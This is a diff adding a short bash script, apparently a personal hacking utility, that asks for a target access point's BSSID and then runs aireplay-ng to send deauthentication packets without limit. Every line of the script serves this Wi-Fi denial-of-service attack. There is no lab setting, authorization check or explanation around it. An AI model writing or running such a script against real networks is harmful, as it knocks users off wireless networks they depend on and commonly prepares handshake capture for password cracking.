@@ -1,0 +1,6 @@
+#!/bin/bash
+
+echo "Deaut Target"
+read -p "BSSID : " bssid;
+sleep 2
+aireplay-ng --deauth 0 -a $bssid
